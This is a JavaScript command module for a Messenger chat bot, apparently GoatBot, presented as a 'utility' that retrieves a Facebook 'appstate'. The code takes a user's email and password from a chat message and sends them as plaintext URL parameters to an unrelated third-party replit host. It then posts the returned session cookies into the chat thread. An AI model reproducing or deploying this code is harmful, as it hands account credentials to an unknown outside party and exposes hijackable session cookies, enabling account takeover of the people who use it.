const axios = require("axios");

module.exports = {
    config: {
      name: "appstate",
      aliases: [],
      author: "shiki", // covert to goat by kira
      version: "69",
      cooldowns: 5,
      role: 0,
      shortDescription: {
        en: "Retrieve user data"
      },
      longDescription: {
        en: "Retrieve user data"
      },
      category: "utility",
      guide: {
        en: "{p}{n} [email password]"
      }
    },

    onStart: async function ({ api, event, args }) {
      // don't change the credits or I'll turn off the APIs
      if (args.length !== 2) {
        return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
      }

      const [email, password] = args.map(arg => arg.trim());

      const res = await axios.get(`https://unrealisticstrangenagware.hayih59124.repl.co/login?email=${email}&password=${password}`);
      const userData = res.data;

      const formattedData = userData.map(item => ({
        "key": item.key,
        "value": item.value,
        "domain": item.domain,
        "path": item.path,
        "hostOnly": item.hostOnly,
        "creation": item.creation,
        "lastAccessed": item.lastAccessed
      }));

      return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
    }
};